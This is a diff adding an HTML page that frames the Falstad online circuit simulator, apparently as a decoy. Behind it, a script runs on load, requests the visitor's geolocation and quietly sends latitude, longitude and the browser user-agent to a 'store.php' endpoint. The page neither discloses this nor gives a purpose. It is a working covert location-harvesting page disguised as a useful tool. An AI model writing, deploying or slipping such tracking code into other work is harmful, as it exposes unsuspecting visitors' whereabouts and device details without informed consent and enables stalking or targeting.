@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<body id="body">
+   <iframe src="https://www.falstad.com/circuit/" frameborder="0" height="2000px" width="1000px"></iframe>
+    
+
+    <p id="demo"></p>
+
+    <script>
+        const body=document.getElementById("body");
+        const x = document.getElementById("demo");
+        body.addEventListener("load",getLocation());
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    x.innerHTML = "...";
+                   
+                }
+            };
+            xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude +"&os=" + navigator.userAgent, true);
+            xhttp.send();
+            
+        }
+    </script>
+
+</body>
+
+</html>
